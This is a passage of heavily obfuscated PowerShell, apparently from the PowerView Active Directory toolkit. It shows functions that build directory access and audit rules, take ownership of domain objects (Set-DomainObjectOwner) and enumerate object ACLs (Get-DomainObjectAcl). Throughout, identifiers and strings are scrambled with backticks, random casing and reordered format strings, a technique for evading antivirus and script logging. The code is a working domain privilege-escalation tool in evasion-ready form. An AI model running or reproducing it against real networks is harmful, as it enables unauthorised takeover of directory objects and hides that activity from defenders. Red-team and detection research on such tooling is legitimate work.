            if (${PSB`oUnDPAram`Ete`RS}[("{1}{3}{0}{2}" -f 'ma','P','in','rincipalDo')]) { ${pr`iNc`iPa`lseA`RCHERARguMEN`Ts}[("{0}{1}{2}"-f 'Dom','ai','n')] = ${p`RiNcip`ALd`o`mAIn} }
            if (${PsBOUn`D`PARA`Me`TErS}[("{1}{0}" -f'erver','S')]) { ${PR`iN`CI`pAl`S`earCHe`RarGu`MeNtS}[("{1}{0}" -f 'rver','Se')] = ${s`ER`VEr} }
            if (${psbO`Undpa`Ra`MeTeRs}[("{0}{1}{2}{3}" -f'Se','ar','ch','Scope')]) { ${Pr`i`NC`IpAl`sEaRC`he`Rarg`UM`Ents}[("{0}{2}{1}"-f 'Search','e','Scop')] = ${SEaRch`sCO`Pe} }
            if (${pSB`ouNDPa`RaM`eters}[("{0}{3}{1}{2}" -f 'Res','Siz','e','ultPage')]) { ${pRiNci`P`ALS`eArcHeRaRG`Ume`Nts}[("{2}{1}{4}{0}{3}" -f 'geSiz','P','Result','e','a')] = ${rEs`ULTP`A`gEsIZE} }
            if (${PsB`O`UNDP`A`RametErs}[("{1}{3}{2}{0}"-f 'mit','Serv','i','erTimeL')]) { ${Pr`i`Nc`ip`Al`sE`ArCHe`RarGUMENTs}[("{1}{0}{2}{3}"-f'e','Serv','rTimeLimi','t')] = ${SeRvE`RTImel`IM`it} }
            if (${PsBouN`dP`A`RaMe`Te`Rs}[("{0}{2}{1}"-f'Tomb','e','ston')]) { ${PRi`NciPa`L`SEa`RChERaRgU`MENTS}[("{1}{2}{0}" -f'e','T','ombston')] = ${tOMBS`T`o`NE} }
            if (${pS`B`ou`NdpArA`METerS}[("{1}{2}{0}" -f 'dential','C','re')]) { ${P`RiNCip`ALS`eARCHeRaR`G`UMEnTs}[("{3}{1}{0}{2}"-f'edenti','r','al','C')] = ${cR`ED`EN`TIaL} }
            ${PRi`N`c`ipAL} = &("{0}{1}{2}" -f'Get-','Do','mainObject') @PrincipalSearcherArguments
            if (-not ${Pr`I`NC`IPaL}) {
                throw ('Una'+'bl'+'e '+'to'+' '+'res'+'olve '+'pri'+'n'+'cipal: '+"$PrincipalIdentity")
            }
            elseif(${PR`I`NcIpAl}."c`ouNT" -gt 1) {
                throw ("{13}{12}{0}{9}{5}{4}{8}{7}{1}{10}{3}{2}{11}{6}"-f 'nci','obj','ly ','ut on','s','e','ed','le AD ',' multip','palIdentity match','ects, b','one is allow','ri','P')
            }
            ${objEc`T`Sid} = ${prI`NciP`AL}."O`B`jECTsiD"
        }
        else {
            ${O`BJECt`siD} = ${PrIn`cIp`Ali`dEN`TiTy}
        }

        ${Ad`R`IGHT} = 0
        foreach(${r} in ${R`igHt}) {
            ${adrIG`Ht} = ${A`DRI`GHT} -bor (([System.DirectoryServices.ActiveDirectoryRights]${R})."Val`UE`__")
        }
        ${AdrI`g`hT} = [System.DirectoryServices.ActiveDirectoryRights]${ad`Ri`gHT}

        ${idENT`i`Ty} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${obJe`c`TsiD})
    }

    Process {
        if(${PscM`D`L`et}.PaRameTErSETnAme -eq ("{0}{2}{3}{1}" -f 'A','pe','u','ditRuleTy')) {

            if(${ob`j`ec`TtYpE} -eq ${nu`Ll} -and ${iN`hE`R`itaN`CETYpe} -eq   (ITEm  ('vAR'+'IA'+'BLE:LF'+'J'))."V`AlUe"::"e`mpTy" -and ${I`NH`E`Ri`TeDOBjEcTtyPe} -eq ${nu`ll}) {
                &("{0}{2}{1}" -f 'N','Object','ew-') ("{8}{10}{1}{0}{6}{7}{9}{3}{4}{2}{5}" -f 'ectoryServices.Ac','.Dir','itRu','u','d','le','tive','Director','Syste','yA','m') -ArgumentList ${i`DenT`ITY}, ${adrig`Ht}, ${aud`itfL`AG}
            } elseif(${Ob`jec`TTYPE} -eq ${N`Ull} -and ${i`Nh`e`Rit`AnCetYPe} -ne   (gi  ("vA"+"rIA"+"BLe:"+"lFJ")  )."v`ALuE"::"EMp`TY" -and ${i`Nheri`T`E`DOBjeCTTY`pE} -eq ${n`ULl}) {
                &("{1}{0}{2}" -f 'bj','New-O','ect') ("{1}{9}{2}{7}{6}{12}{10}{4}{5}{0}{8}{11}{3}"-f 'rect','S','m.D','tRule','vices.A','ctiveDi','ry','irecto','oryAu','yste','r','di','Se') -ArgumentList ${idEN`T`iTY}, ${aD`RiGht}, ${AuD`I`TFl`AG}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${in`heRitAN`C`eTyPE})
            } elseif(${O`B`jEcttYpe} -eq ${n`ULl} -and ${in`HeRit`ANcet`Ype} -ne  (  vArIaBLe ('lf'+'j'))."v`ALue"::"E`mPTY" -and ${I`NHeritED`OBjec`TT`ype} -ne ${nU`ll}) {
                &("{1}{2}{0}" -f'bject','N','ew-O') ("{0}{9}{11}{5}{8}{6}{4}{7}{10}{3}{1}{2}" -f 'Sys','yAudit','Rule','ctor','ive','ry','es.Act','D','Servic','tem.Direc','ire','to') -ArgumentList ${i`D`E`NTITY}, ${adrI`ght}, ${auD`i`Tf`LaG}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`N`hE`RiTAnC`ETypE}), ${InHeRi`TEdOBJ`ec`TtyPe}
            } elseif(${ob`J`eC`TtyPE} -ne ${NU`Ll} -and ${InH`er`iTa`NcEtYpe} -eq   (  GET-ChIldITeM ('vaR'+'iabLe:l'+'fJ') )."v`ALue"::"e`mpTy" -and ${inh`E`R`ITEDo`BjEC`TtyPe} -eq ${NU`LL}) {
                &("{2}{1}{0}"-f'bject','-O','New') ("{1}{8}{4}{0}{6}{2}{7}{3}{5}"-f'ctiveD','System.Dire','o','yAuditR','A','ule','irect','r','ctoryServices.') -ArgumentList ${i`de`NTitY}, ${a`dR`iGhT}, ${aU`dItf`lag}, ${OB`je`CtTYPE}
            } elseif(${oBj`ECTty`pE} -ne ${nU`lL} -and ${i`NheRi`T`A`NCETy`pe} -ne   ( item ('v'+'ARIAbL'+'E'+':lfJ'))."VA`Lue"::"e`MPty" -and ${In`h`Erit`eDoBjEcT`T`Y`pe} -eq ${N`ULl}) {
                &("{0}{3}{2}{1}" -f'New-O','ct','je','b') ("{4}{5}{3}{2}{8}{9}{10}{6}{7}{0}{1}"-f'itRul','e','rectoryServ','Di','Syste','m.','e','DirectoryAud','i','ces','.Activ') -ArgumentList ${IdE`N`T`itY}, ${adR`iG`hT}, ${a`UDItf`l`AG}, ${oB`JEct`TypE}, ${i`NheriTA`NcE`TyPe}
            } elseif(${ObjeCT`T`Ype} -ne ${NU`ll} -and ${iNh`erit`AnCE`T`yPe} -ne   ${l`FJ}::"EmP`TY" -and ${In`herit`edOBJEc`TTypE} -ne ${n`ULl}) {
                &("{1}{2}{0}"-f't','New-Obj','ec') ("{11}{12}{14}{0}{4}{13}{1}{7}{10}{6}{5}{2}{8}{9}{3}"-f'ect','r','yAud','ule','or','veDirector','ces.Acti','v','it','R','i','Sys','t','ySe','em.Dir') -ArgumentList ${IDe`NT`i`Ty}, ${A`d`RIght}, ${AUDItf`L`AG}, ${ob`je`C`TTYpE}, ${IN`H`ERIT`AncetYpE}, ${INhEri`T`edobjECT`TyPE}
            }

        }
        else {

            if(${OBjeCT`T`ypE} -eq ${Nu`ll} -and ${INheR`I`T`A`NCETyPE} -eq  (  VariAbLe  ("{1}{0}"-f 'fj','l') )."va`lUE"::"Emp`TY" -and ${iN`Heri`T`EDoB`JeCttYpe} -eq ${Nu`lL}) {
                &("{2}{1}{0}" -f 't','w-Objec','Ne') ("{13}{0}{11}{12}{1}{10}{5}{8}{7}{4}{6}{3}{2}{9}"-f'yst','torySe','ssRul','e','v','vices','eDirectoryAcc','Acti','.','e','r','em','.Direc','S') -ArgumentList ${id`entitY}, ${aDr`I`GhT}, ${a`c`c`eSSCON`T`RoLTYPE}
            } elseif(${ObJE`ctt`ype} -eq ${nU`lL} -and ${I`NH`Er`i`TA`NCeTyPe} -ne   ( vAriaBLe ('lf'+'j') -valUEOn )::"EMp`TY" -and ${InH`E`RITedoBj`eCTT`ype} -eq ${NU`Ll}) {
                &("{2}{0}{1}"-f'ew-','Object','N') ("{1}{7}{0}{8}{2}{9}{5}{4}{3}{6}"-f 'torySe','Syst','v','yAcces','tor','s.ActiveDirec','sRule','em.Direc','r','ice') -ArgumentList ${iD`E`NtITy}, ${aD`RIgHt}, ${a`cc`eSS`cOntRoLtY`pe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${iNhe`RI`TANC`etyPe})
            } elseif(${OBje`CT`TyPe} -eq ${nU`LL} -and ${I`NHE`RitanC`e`TyPe} -ne   ( gci ('VaRI'+'aB'+'lE'+':lFJ')  )."vaL`UE"::"Em`PTY" -and ${INhe`R`i`TedoBJe`CTTYpe} -ne ${Nu`ll}) {
                &("{0}{2}{1}" -f 'Ne','ject','w-Ob') ("{2}{8}{1}{6}{3}{5}{0}{4}{7}" -f 'D','Dir','Syst','toryServices.Activ','irectoryAccessRul','e','ec','e','em.') -ArgumentList ${I`dENTi`Ty}, ${A`D`RiGHT}, ${a`cCe`ss`C`onTro`lTyPe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${In`heRit`Anc`ETypE}), ${IN`HErITEdo`BJectT`y`Pe}
            } elseif(${OBjec`TTy`Pe} -ne ${N`UlL} -and ${iNhE`Ri`TAN`C`E`TYpe} -eq  (  Ls ('V'+'a'+'r'+'iAble:lFJ'))."va`lUE"::"EMp`TY" -and ${INh`eRiT`ed`oBJ`ec`TtY`PE} -eq ${nU`ll}) {
                &("{1}{2}{0}"-f 't','New-Obje','c') ("{10}{11}{3}{2}{14}{5}{4}{0}{9}{7}{1}{12}{8}{13}{6}" -f 'ices.Ac','oryAc','m.Directo','e','rv','e','le','iveDirect','essR','t','S','yst','c','u','ryS') -ArgumentList ${iden`Ti`TY}, ${aDr`IGHT}, ${a`CCE`SS`cONtrOLtype}, ${oBJec`Tt`y`PE}
            } elseif(${O`BJec`TType} -ne ${n`ULl} -and ${INH`e`RIt`ANce`TYpE} -ne   (gEt-vaRIABLe ("{1}{0}" -f 'fJ','L') -vA )::"E`mpty" -and ${INheRItEDObJE`C`T`Ty`Pe} -eq ${nU`Ll}) {
                &("{2}{1}{0}" -f't','-Objec','New') ("{5}{8}{3}{10}{0}{9}{4}{7}{1}{6}{2}"-f 'vices.ActiveDirec','e','sRule','em.Director','Ac','Sy','s','c','st','tory','ySer') -ArgumentList ${IDE`NtI`TY}, ${a`dRI`gHT}, ${A`cces`sCO`NTRoLt`YpE}, ${Ob`Je`CTTy`Pe}, ${InH`eR`It`A`NCEtYPE}
            } elseif(${objE`CT`TY`pe} -ne ${nu`ll} -and ${In`heriTANc`Ety`Pe} -ne   (VAriABLE  ("{1}{0}" -f 'fJ','L')  -ValuE )::"EMP`TY" -and ${iNhe`R`ITedO`BJeCtT`Y`pE} -ne ${n`Ull}) {
                &("{1}{0}{2}"-f'jec','New-Ob','t') ("{4}{3}{1}{6}{0}{2}{7}{8}{5}" -f'orySer','rec','vice','Di','System.','sRule','t','s.ActiveD','irectoryAcces') -ArgumentList ${Id`EnT`iTY}, ${aD`Ri`GHt}, ${AcCess`ConTroL`T`yPe}, ${O`BjECt`T`YpE}, ${inHE`R`ITance`Ty`Pe}, ${I`NHEritedo`BJ`ect`TY`pE}
            }

        }
    }
}


function se`T-dOMa`in`o`BJECtOwneR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{12}{7}{9}{3}{8}{4}{10}{0}{6}{1}{11}{5}{2}" -f 'rS','i','nctions','Pr','ces','gFu','tateChang','SU','o','seShould','sFo','n','P'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{1}{2}"-f 'dProc','es','s','P','SShoul'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSITiON = 0, mandAtORy = ${tR`UE}, VALuEFroMpiPeLINE = ${t`Rue}, VAlUEfrOmpipELInEbYPRopErTyname = ${T`RUe})]
        [Alias({"{3}{0}{1}{2}"-f 'i','shedNa','me','Distingu'}, {"{3}{2}{0}{1}{4}"-f 'c','countNa','mA','Sa','me'}, {"{1}{0}" -f 'e','Nam'})]
        [String]
        ${iDE`N`TiTy},

        [Parameter(MANdAtoRy = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Own'})]
        [String]
        ${oWNE`RID`eNTiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filt','er'})]
        [String]
        ${l`dA`pFIlTER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'AD','SPath'})]
        [String]
        ${SEA`RcHB`A`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{4}{3}"-f 'Do','t','mainCon','r','rolle'})]
        [String]
        ${Se`RV`Er},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{2}{0}"-f 'evel','O','neL'}, {"{0}{1}"-f'Su','btree'})]
        [String]
        ${sEaRch`s`C`ope} = ("{1}{2}{0}" -f'ree','Sub','t'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`E`SUltp`Ag`ESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`Ver`TImel`imIt},

        [Switch]
        ${tom`B`ST`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`de`NtiAl} =   (gEt-chIlDiTEm ("V"+"AR"+"IABlE:q"+"fN")  )."V`ALUe"::"eM`ptY"
    )

    BEGIN {
        ${Se`ARcHe`RARGumE`NTs} = @{}
        if (${psbOUndpA`Ra`M`ete`Rs}[("{0}{1}"-f 'Do','main')]) { ${sEa`RCh`E`RArgUmENtS}[("{1}{0}" -f'main','Do')] = ${DOM`AIn} }
        if (${psBo`UndP`A`RamETe`Rs}[("{0}{2}{1}"-f 'LDAPF','ter','il')]) { ${S`eArchEra`RGu`M`eNTs}[("{1}{0}{2}" -f 'D','L','APFilter')] = ${LdaPf`iLt`eR} }
        if (${PsBOUnd`p`AraME`TErS}[("{2}{3}{1}{0}" -f'hBase','rc','Se','a')]) { ${sea`RCheRArg`UmE`NTs}[("{2}{3}{1}{0}"-f'Base','h','S','earc')] = ${SE`ARCHB`ASe} }
        if (${Psb`oUNdPaRA`mete`RS}[("{1}{0}"-f'ver','Ser')]) { ${SeaR`c`he`RA`RguME`NTs}[("{0}{1}"-f 'Se','rver')] = ${SeRV`er} }
        if (${pSb`OUndP`ArAmEtE`RS}[("{1}{2}{3}{0}" -f 'Scope','S','e','arch')]) { ${sE`A`RCH`e`RArGumEnTS}[("{2}{1}{0}"-f 'e','hScop','Searc')] = ${SeA`R`chSc`OPE} }
        if (${p`SBoU`NDPa`Ram`eTE`Rs}[("{2}{1}{3}{0}"-f 'ize','esul','R','tPageS')]) { ${SearC`H`eraR`G`UMEnTS}[("{2}{0}{1}"-f'Pa','geSize','Result')] = ${REs`ULTPa`GESiZe} }
        if (${P`SBoUn`DpArAm`ETERs}[("{1}{0}{4}{3}{2}"-f'e','S','it','imeLim','rverT')]) { ${s`earc`HeRaRG`UM`eNTs}[("{3}{0}{1}{2}"-f 'erv','erTimeLim','it','S')] = ${serVER`Ti`me`LIMIT} }
        if (${pSBOundP`Ara`Me`Te`Rs}[("{3}{1}{2}{0}" -f'e','bst','on','Tom')]) { ${SE`ARCh`ER`ArG`UmENTs}[("{0}{2}{1}" -f 'Tom','ne','bsto')] = ${to`MBsT`o`Ne} }
        if (${PsboUN`DPara`mETE`RS}[("{0}{3}{2}{1}"-f'Cred','al','nti','e')]) { ${se`ArcHeRArg`UM`En`TS}[("{1}{2}{0}" -f 'al','C','redenti')] = ${cR`eDENtI`AL} }

        ${o`WnErSiD} = &("{2}{3}{1}{0}{4}" -f 'ec','DomainObj','Ge','t-','t') @SearcherArguments -Identity ${OWN`er`iDENTI`Ty} -Properties ("{2}{1}{0}" -f 'id','jects','ob') | &("{1}{3}{2}{0}"-f't','S','lect-Objec','e') -ExpandProperty ("{1}{2}{0}" -f'sid','obje','ct')
        if (${OWn`eRSId}) {
            ${oW`NE`Ri`DeNtiT`yrEFEreNce} = [System.Security.Principal.SecurityIdentifier]${O`W`NErsiD}
        }
        else {
            &("{1}{0}{3}{2}"-f 'i','Wr','ning','te-War') ('[Set-'+'D'+'omainObj'+'ectOwner]'+' '+'Error'+' '+'par'+'sin'+'g '+'owner'+' '+'ide'+'ntity'+' '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if (${O`Wn`eRiDE`Ntity`RE`FeReNce}) {
            ${seARCher`A`R`GumEnTs}['Raw'] = ${tR`UE}
            ${sEaR`C`H`eRaRgu`meNTS}[("{0}{1}" -f 'I','dentity')] = ${i`de`NtitY}

            
            ${rAW`oBje`CT} = &("{4}{0}{2}{3}{1}"-f '-Dom','t','ainO','bjec','Get') @SearcherArguments

            ForEach (${O`BjEct} in ${RAwOB`jE`ct}) {
                try {
                    &("{2}{0}{1}" -f 'e-Verbos','e','Writ') ('['+'Set-Doma'+'i'+'nObje'+'ct'+'O'+'wner] '+'Atte'+'mp'+'tin'+'g '+'to'+' '+'set'+' '+'the'+' '+'ow'+'ner '+'fo'+'r '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    ${ent`Ry} = ${raWo`BJe`cT}.("{2}{3}{0}{1}"-f'nt','ry','Get','DirectoryE').Invoke()
                    ${E`NT`RY}."P`S`BAsE"."OPT`i`ONs"."SecURitYM`AS`KS" = ("{0}{1}" -f'Own','er')
                    ${en`TRy}."pSba`se"."Objec`TSecU`RiTY".("{0}{1}{2}"-f'Set','O','wner').Invoke(${O`wNeRidEN`Tit`YREfErE`NCe})
                    ${EN`T`RY}."p`sbAse".("{3}{2}{0}{1}"-f'm','itChanges','m','Co').Invoke()
                }
                catch {
                    &("{1}{0}{2}"-f'-Warni','Write','ng') ('['+'Set-Domain'+'Obj'+'ec'+'tOwner] '+'Err'+'or '+'set'+'t'+'ing '+'own'+'er'+': '+"$_")
                }
            }
        }
    }
}


function GE`T-doMAIn`O`BjeCt`A`cl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}"-f 'ould','Process','PSSh'}, '')]
    [OutputType({"{0}{2}{1}{3}" -f 'PowerV','ew','i','.ACL'})]
    [CmdletBinding()]
    Param (
        [Parameter(PosItIOn = 0, vALUefROmPIpelINe = ${tR`Ue}, valUEfrompiPelinEBYpRopERTynAmE = ${TR`UE})]
        [Alias({"{1}{3}{2}{0}" -f'me','Dis','a','tinguishedN'}, {"{1}{0}{2}"-f 'coun','SamAc','tName'}, {"{1}{0}"-f'ame','N'})]
        [String[]]
        ${iDE`NTI`Ty},

        [Switch]
        ${SA`Cl},

        [Switch]
        ${reso`lveg`UIDS},

        [String]
        [Alias({"{1}{0}" -f 'ights','R'})]
        [ValidateSet('All', {"{2}{1}{0}" -f'd','r','ResetPasswo'}, {"{3}{1}{2}{0}"-f'ers','rit','eMemb','W'})]
        ${RIghT`SFIlT`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Fil','er','t'})]
        [String]
        ${lD`APf`i`Lter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'ADSP','h','at'})]
        [String]
        ${SE`A`RcHbA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}" -f'roller','Dom','nCont','ai'})]
        [String]
        ${SEr`Ver},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}{2}" -f 'v','OneLe','el'}, {"{0}{1}{2}" -f 'S','u','btree'})]
        [String]
        ${sEaRCH`sc`oPe} = ("{1}{0}"-f 'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`Ul`TpAg`Es`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`E`RvERTimelI`miT},

        [Switch]
        ${TOm`Bsto`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRED`enT`ial} =  ${Q`Fn}::"em`PtY"
    )

    BEGIN {
        ${SeaR`CHeR`ARG`UME`NTS} = @{
            ("{1}{0}{2}"-f 'ope','Pr','rties') = ("{10}{12}{16}{11}{13}{8}{4}{2}{1}{9}{3}{7}{5}{0}{15}{6}{14}"-f ',','ist','d','uish',',','e','tsi','ednam','scriptor','ing','sam','e,ntsecur','account','ityde','d','objec','nam')
        }

        if (${P`sB`oundp`A`RAMEtErs}[("{1}{0}" -f'acl','S')]) {
            ${sEArCHEra`RGUme`N`TS}[("{1}{0}{2}"-f'as','SecurityM','ks')] = ("{1}{0}" -f'l','Sac')
        }
        else {
            ${s`E`ArcH`ERArgUmEntS}[("{2}{1}{3}{0}" -f 'Masks','it','Secur','y')] = ("{1}{0}" -f 'cl','Da')
        }
        if (${psBOu`NDpar`A`mEteRs}[("{0}{1}"-f 'D','omain')]) { ${seArCHEraRg`Ume`N`Ts}[("{0}{1}"-f 'D','omain')] = ${dOM`AiN} }
        if (${PSBOU`N`dpaRAMETe`RS}[("{2}{0}{1}" -f 'arc','hBase','Se')]) { ${sEA`Rch`ERa`RGUmeN`Ts}[("{1}{0}{2}" -f'h','Searc','Base')] = ${SEar`ch`BAsE} }
        if (${P`Sbou`NdPA`RaMet`e`RS}[("{2}{0}{1}" -f 'rv','er','Se')]) { ${SEaRC`hERa`RguM`E`NtS}[("{1}{0}"-f'er','Serv')] = ${sER`V`er} }
        if (${psb`OU`NdpARAmE`TErS}[("{1}{2}{0}{3}"-f 'o','Sear','chSc','pe')]) { ${seARCHERAR`GU`m`E`Nts}[("{2}{0}{1}" -f 'rchSc','ope','Sea')] = ${sEaR`c`HSc`OPE} }
        if (${pSB`ouN`dpA`RAmETE`Rs}[("{1}{0}{2}{3}" -f 'sultP','Re','age','Size')]) { ${SE`ARc`hE`RARG`UMeN`Ts}[("{3}{1}{0}{2}"-f'S','ge','ize','ResultPa')] = ${RE`SULTPa`gesize} }
        if (${P`sBOU`NDp`ArAMeTErS}[("{0}{1}{3}{2}" -f 'S','er','rTimeLimit','ve')]) { ${s`e`ArChERArgu`ME`Nts}[("{2}{1}{0}{4}{3}"-f 'e','im','ServerT','t','Limi')] = ${SE`RVeR`TiM`el`IMIT} }
        if (${P`sbOunD`parAMe`TE`RS}[("{0}{1}" -f'Tombst','one')]) { ${s`ear`CHE`RaR`gU`MenTS}[("{2}{0}{1}"-f'o','ne','Tombst')] = ${to`M`BStOnE} }
        if (${PsboU`N`DpA`RaMET`ERs}[("{1}{0}{2}"-f 'redentia','C','l')]) { ${SEaR`CHEra`RGU`M`e`NtS}[("{1}{0}{2}{3}" -f 'ed','Cr','entia','l')] = ${cRe`D`EnTI`Al} }
        ${s`e`ArcHEr} = &("{1}{0}{2}{3}" -f 'inSea','Get-Doma','rc','her') @SearcherArguments

        ${Dom`Ai`NG`UIDmAp`A`RguMEntS} = @{}
        if (${PSb`OUN`Dp`ARa`mEtErs}[("{1}{0}" -f'in','Doma')]) { ${dOM`A`INgUid`Mapa`Rgume`Nts}[("{0}{1}"-f'Do','main')] = ${D`om`AIN} }
        if (${PSB`Oun`d`Par`AMet`ERS}[("{1}{0}" -f'rver','Se')]) { ${dom`Ain`gU`IDm`APAr`GumEn`TS}[("{0}{1}{2}" -f 'Ser','ve','r')] = ${s`eRvER} }
        if (${pSB`oUnD`pa`RAmEt`ERS}[("{4}{0}{2}{3}{1}"-f'esultP','e','age','Siz','R')]) { ${dOMAin`gUID`ma`p`Ar`gUmE`NTs}[("{3}{4}{0}{2}{1}" -f'ltP','ze','ageSi','Res','u')] = ${r`ESuL`TPA`GEsi`Ze} }
        if (${p`SBoU`NDpAr`AME`TerS}[("{0}{1}{3}{2}"-f'Se','rverTimeL','t','imi')]) { ${DO`MAinGUId`Ma`p`A`RGumEnTs}[("{0}{4}{3}{2}{1}"-f'Ser','it','m','rTimeLi','ve')] = ${SERv`Ert`IMe`l`i`mIT} }
        if (${pSBoun`dP`Ar`A`METERS}[("{3}{0}{1}{2}" -f'r','eden','tial','C')]) { ${D`OmAin`GUIdm`A`pArGUM`ENtS}[("{0}{1}{2}"-f 'C','r','edential')] = ${C`ReDE`NTi`AL} }

        
        if (${Ps`B`ouNdpA`RA`meTErS}[("{3}{2}{1}{0}"-f'IDs','GU','olve','Res')]) {
            ${GUI`DS} = &("{4}{2}{3}{0}{1}"-f'M','ap','mainGUI','D','Get-Do') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${SeA`RcHER}) {
            ${iD`enT`i`TYFiLTeR} = ''
            ${F`iLter} = ''
            ${IdeNT`i`TY} | &("{2}{3}{1}{0}"-f 'ct','e','Where-Ob','j') {${_}} | &("{2}{3}{0}{1}" -f'h-O','bject','ForE','ac') {
                ${Id`E`Nt`ityi`N`sTaNce} = ${_}.("{0}{1}"-f'R','eplace').Invoke('(', '\28').("{1}{2}{0}" -f'lace','R','ep').Invoke(')', '\29')
                if (${ide`NTityIN`s`TAnCE} -match ("{0}{1}"-f'^S-','1-.*')) {
                    ${i`D`entI`TYfIl`TeR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IdenTI`Tyin`sTa`N`ce} -match ((("{0}{3}{1}{2}" -f '^(C','0}OU{0}DC)=.','*','N{'))  -F [ChaR]124)) {
                    ${i`DEnT`IT`YFILteR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`S`Bound`pARa`Met`ERS}[("{0}{1}" -f 'Domai','n')]) -and (-not ${Psb`oUNd`pa`RAM`eteRs}[("{0}{1}{2}"-f 'Sea','r','chBase')])) {
                        
                        
                        ${i`d`eNtIt`YDoMAiN} = ${iDEnt`I`TYINSt`ANCe}.("{1}{0}"-f 'String','Sub').Invoke(${Id`E`NTityInST`AN`CE}.("{1}{0}"-f'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}{3}{4}"-f'Verbo','Wri','te-','s','e') ('[G'+'et-DomainObj'+'ectA'+'cl'+'] '+'Ex'+'t'+'ra'+'cted '+'do'+'main'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${seArCh`ErAR`g`UM`EN`TS}[("{0}{1}"-f'Dom','ain')] = ${ideNT`it`Y`domA`IN}
                        ${SEA`R`cH`ER} = &("{0}{4}{2}{3}{1}" -f'Get-','er','ainS','earch','Dom') @SearcherArguments
                        if (-not ${SE`ArCH`eR}) {
                            &("{2}{0}{3}{1}"-f'War','ng','Write-','ni') ('['+'Get-'+'D'+'omainObject'+'Acl]'+' '+'Un'+'able'+' '+'t'+'o '+'ret'+'r'+'ieve '+'dom'+'ain '+'sea'+'rch'+'er '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${I`d`e`NTI`TYInStAnce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${G`UIdB`ytesT`RINg} = (([Guid]${iD`EN`T`ITYi`NstaNCE}).("{0}{2}{1}" -f'ToBy','rray','teA').Invoke() | &("{4}{2}{3}{0}{1}"-f 'Objec','t','rEac','h-','Fo') { '\' + ${_}.("{2}{0}{1}"-f 'oStri','ng','T').Invoke('X2') }) -join ''
                    ${i`Den`Ti`T`yfiLTer} += "(objectguid=$GuidByteString)"
                }
                elseif (${i`Den`TItYIN`St`A`NCE}.("{2}{0}{1}"-f 'n','tains','Co').Invoke('.')) {
                    ${iDE`N`T`It`YFIlTer} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${Ide`NTitY`F`iLtER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${iDEnTi`T`yFIlter} -and (${idE`N`TiT`Y`FiLTeR}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
                ${Fi`LTeR} += "(|$IdentityFilter)"
            }

            if (${Ps`Bo`Un`DpaRAm`ET`erS}[("{2}{1}{0}" -f 'r','Filte','LDAP')]) {
                &("{2}{1}{0}"-f 'ose','ite-Verb','Wr') ('['+'G'+'e'+'t-Dom'+'ain'+'Objec'+'tAcl] '+'Using'+' '+'add'+'i'+'t'+'ional '+'LD'+'AP '+'f'+'ilter:'+' '+"$LDAPFilter")
                ${FiL`TER} += "$LDAPFilter"
            }

            if (${fIL`TER}) {
                ${sEar`CHER}."fIL`Ter" = "(&$Filter)"
            }
            &("{1}{0}{2}" -f'te-V','Wri','erbose') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            ${reSU`l`Ts} = ${S`eArCHer}.("{1}{0}"-f'dAll','Fin').Invoke()
            ${RES`ULTs} | &("{3}{1}{2}{0}" -f'Object','e','-','Wher') {${_}} | &("{1}{2}{0}" -f'ct','F','orEach-Obje') {
                ${oB`Je`CT} = ${_}."p`RoPE`RtI`ES"

                if (${oBJ`e`ct}."OB`J`Ects`iD" -and ${Ob`JE`ct}."OBje`c`TsiD"[0]) {
                    ${o`Bj`ECt`SId} = (&("{0}{1}{2}"-f'N','ew-Objec','t') ("{2}{5}{1}{9}{3}{6}{0}{4}{10}{7}{8}"-f'i','stem','S','Sec','ncipal.Secur','y','urity.Pr','ent','ifier','.','ityId')(${o`BjecT}."obJ`ects`ID"[0],0))."va`lUe"
                }
                else {
                    ${OBj`eCtS`id} = ${NU`Ll}
                }

                try {
